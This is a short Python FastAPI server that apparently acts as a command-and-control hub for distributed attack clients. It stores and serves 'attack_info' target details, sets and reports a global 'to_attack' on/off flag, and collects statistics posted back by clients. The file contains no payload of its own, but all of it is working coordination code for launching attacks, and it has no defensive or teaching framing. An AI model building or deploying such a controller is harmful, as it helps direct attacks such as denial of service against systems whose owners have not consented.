from fastapi import FastAPI
from typing import Dict, Any

app = FastAPI()

ATTACK_INFO = {}
TO_ATTACK = False
CLIENTS_STATS = []


@app.post("/attack_info")
async def set_attack_info(info: Dict[str, str | int]) -> None:
    global ATTACK_INFO
    ATTACK_INFO = info


@app.get("/attack_info")
async def get_attack_info():
    return ATTACK_INFO


@app.post("/to_attack")
async def post_to_attack(command: dict):
    global TO_ATTACK
    if command["to_attack"] == "yes":
        TO_ATTACK = True
    elif command["to_attack"] == "no":
        TO_ATTACK = False


@app.get("/to_attack")
async def get_to_attack():
    return {"to_attack": TO_ATTACK}


@app.post("/clients_stats")
async def set_clients_stats(client_stats: Dict[str, Any]):
    CLIENTS_STATS.append(client_stats)


@app.get("/clients_stats")
async def get_clients_stats():
    if CLIENTS_STATS:
        return {"clients_stats": CLIENTS_STATS}
    else:
        return {"detail": "No clients stats"}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)
